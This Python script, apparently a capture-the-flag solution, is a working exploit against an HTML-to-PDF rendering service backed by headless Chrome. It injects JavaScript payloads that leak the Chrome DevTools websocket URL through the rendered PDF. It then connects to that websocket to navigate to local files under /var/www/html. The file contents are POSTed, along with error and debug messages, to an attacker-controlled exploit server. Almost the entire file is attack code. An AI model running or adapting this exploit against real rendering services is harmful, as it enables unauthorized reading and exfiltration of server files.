from threading import Thread
import time
import os
import random
import PyPDF2
import re
import io
from datetime import datetime
import requests

PORT = 45098

TARGET_URL = "http://localhost:80"
EXPLOIT_SERVER = "localhost:5000"


def download_pdf(payload):
    r = requests.post(f"{TARGET_URL}/render.php", data={
        "content": payload
    })

    if r.status_code != 200:
        return None

    return r.content


def parse_pdf(pdf_content):
    text = ""
    reader = PyPDF2.PdfReader(io.BytesIO(pdf_content))
    get_text = False
    for page in reader.pages:
        page_content = page.extract_text()
        pattern = r"localhost:[0-9]+\/devtools\/page\/[a-zA-Z0-9\n]+"
        # Matching
        matches = re.finditer(pattern, page_content, re.MULTILINE)
        for match in matches:
            ws_url = match.group()
            return ws_url.replace("\n","")
    return None


def new_scan_payload(port):
    payload = f"""
<html>
    <body>
        <script>
            for(let port = {port}; port < {port+1}; port++)
""" + """{
                let iframe = document.createElement('iframe');
                iframe.src = `http://localhost:${port}/json/new?file:///etc/passwd`;
                iframe.width = 1000;
                iframe.height = 200;
                document.body.appendChild(iframe);
            }
        </script>
    </body>
</html>
"""

    return payload


def create_wait_payload():
    payload = f"""
<html>
    <body>
    <img src="http://{EXPLOIT_SERVER}/get_image.png?wait=10" width=10 height=10>

        <script>
            let wsurl = "ws://{EXPLOIT_SERVER}/get_port";
            let ws = new WebSocket(wsurl);
            
            ws.addEventListener("message", (event) => 
""" + """
            {
                let chrome_debug_url = `ws://${event.data}`;
                let chrome_ws = new WebSocket(chrome_debug_url);

                chrome_ws.onerror = (e => { 
"""+ f"""
                    fetch("http://{EXPLOIT_SERVER}/error?msg="+JSON.stringify(e))
"""+ """
                })
                chrome_ws.onmessage = (e => {
"""+ f"""
                    fetch("http://{EXPLOIT_SERVER}/message?msg="+JSON.stringify(e.data))
"""+ """
                })

                const paths = ["/var/www/html/"];

                chrome_ws.onopen = async () => {
                    let i = 0;

                    for(let path of paths){
""" + f"""
                        fetch("http://{EXPLOIT_SERVER}/dumping?"+path)
"""+ """


                        chrome_ws.send(JSON.stringify({
                            id: i++,
                            method: "Page.navigate",
                            params: {
                                url: `view-source:file://${path}`
                            }
                        }))

                        await new Promise(r => setTimeout(r, 500))

                        chrome_ws.send(JSON.stringify({
                            id: i++,
                            method: "Runtime.evaluate",
                            params: {
""" + f"""
                                expression: "fetch('http://{EXPLOIT_SERVER}/log', 
""" + """
                                {method:'POST', body:document.body.innerHTML})"
                            }
                        }))

                        await new Promise(r => setTimeout(r, 500))
                    }
                }

                console.log("Message from server ", event.data);
            });
        </script>
    </body>
</html>
"""

    return payload


class ScanThread(Thread):
    def __init__(self, n = 0):
        Thread.__init__(self, name=f"ScanThread-{n}")

    def run(self):
        run_id = random.randint(0, 1000000)
        print("Gonna scan'em all")

        data = download_pdf(new_scan_payload(PORT))

        if data is None:
            print("Error downloading pdf in Scan Thread")
            return

        print("Downloaded scan payload")

        result = parse_pdf(data)

        if result:
            print(f"PWNED: {result}")

            with open('websocket.txt', 'w') as f:
                f.write(result)

            #with open(f"download_{run_id}_{START_SCAN}.pdf", "wb") as f:
            #    f.write(data)            
        else:
            print("No luck")
            os._exit(0)

class WaitThread(Thread):
    def __init__(self):
        Thread.__init__(self, name="WaitThread")

    def run(self):
        print("Gonna busy wait")      

        ScanThread().start()

        data = download_pdf(create_wait_payload())

        if data is not None:
            print("Downloaded payload")
            #with open("wait_thread.pdf", "wb") as f:
            #    f.write(data)
        else:
            print("Error downloading wait thread")

        print("End busy wait")
        try:
            os.unlink("websocket.txt")
        except FileNotFoundError:
            pass


if __name__ == '__main__':
    wait_thread = WaitThread()
    wait_thread.start()
    wait_thread.join()
    os._exit(0)
